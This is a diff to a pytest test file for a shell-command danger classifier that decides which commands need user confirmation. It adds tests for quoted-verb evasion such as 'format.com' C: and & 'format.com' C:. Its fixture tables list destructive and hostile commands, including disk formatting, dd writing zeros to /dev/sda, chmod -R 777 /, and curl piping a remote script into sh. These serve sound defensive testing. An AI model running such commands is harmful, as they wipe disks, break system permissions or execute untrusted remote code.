@@ -46,7 +46,9 @@ ASK = {
                        "rundll32 x.dll,Run", "schtasks /create /tn x /tr y"],
     },
     tp.DANGEROUS: {
-        "bash": ["format C:", "format.com C:", "mkfs.ext4 /dev/sdb", "dd if=/dev/zero of=/dev/sda", "chmod -R 777 /",
+        "bash": ["format C:", "format.com C:", "'format' C:", '"format" C:',
+                 "'format.com' C:", 'echo ok; "format.com" C:', "mkfs.ext4 /dev/sdb",
+                 "dd if=/dev/zero of=/dev/sda", "chmod -R 777 /",
                  "chown -R me /", "curl https://x.sh | sh", "wget -qO- x | bash", "kill -9 123", "pkill python",
                  "killall node", "git push --force", "git push -f origin main", "git reset --hard HEAD~1",
                  "git checkout -- .", "git restore src/x.py", "git filter-branch --all", "shutdown -h now"],
@@ -108,6 +110,47 @@ def test_interactive_allows_read_only_powershell_formatters():
         assert _shell(command).action == tp.ALLOW, command
     assert _shell("format C:").action == tp.CONFIRM
     assert _shell("format.com C:").action == tp.CONFIRM
+
+
+@pytest.mark.parametrize("label,verb_and_args", [
+    (tp.DELETION, "rm -rf build"), (tp.DELETION, "del x.txt"),
+    (tp.DELETION, "truncate -s 0 log"),
+    (tp.ARCHIVE, "unzip a.zip"), (tp.ARCHIVE, "tar -xf a.tar"),
+    (tp.ARCHIVE, "7z x a.7z"), (tp.ARCHIVE, "gunzip a.gz"),
+    (tp.ARCHIVE, "gzip -d a.gz"), (tp.ARCHIVE, "expand a.cab -F:* out"),
+    (tp.FOREIGN_PROCESS, "start chrome"), (tp.FOREIGN_PROCESS, "cmd /c build.bat"),
+    (tp.FOREIGN_PROCESS, "wscript x.vbs"),
+    (tp.DANGEROUS, "format C:"), (tp.DANGEROUS, "format.com C:"),
+    (tp.DANGEROUS, "dd if=/dev/zero of=/dev/sda"),
+    (tp.DANGEROUS, "reg delete HKLM\\X"),
+    (tp.DANGEROUS, "chmod -R 777 /"), (tp.DANGEROUS, "kill -9 123"),
+    (tp.DANGEROUS, "sc delete svc"),
+])
+@pytest.mark.parametrize("quote", ["'", '"'])
+def test_quoted_command_position_keeps_danger(label, verb_and_args, quote):
+    verb, args = verb_and_args.split(" ", 1)
+    command = f"{quote}{verb}{quote} {args}"
+    assert tp.danger(command, WS) == label, command
+    assert _shell(command).action == tp.CONFIRM, command
+
+
+@pytest.mark.parametrize("command,label", [
+    (r"\rm -rf build", tp.DELETION),
+    ('echo ok; "format.com" C:', tp.DANGEROUS),
+    ("printf 'format'", None),
+    ('echo "rm"', None),
+    ("Get-ChildItem | Write-Output 'kill'", None),
+    ("rm -rf build", tp.DELETION),  # original classification must survive normalization
+])
+def test_command_position_normalization_does_not_promote_arguments_or_lose_hits(command, label):
+    assert tp.danger(command, WS) == label, command
+
+
+def test_powershell_call_operator_on_quoted_executable_still_prompts():
+    # A launch may retain FOREIGN_PROCESS, or the normalized disk-wipe label.
+    command = "& 'format.com' C:"
+    assert tp.danger(command, WS) in (tp.FOREIGN_PROCESS, tp.DANGEROUS)
+    assert _shell(command).action == tp.CONFIRM
 
 
 def test_interactive_asks_only_for_the_danger_table():
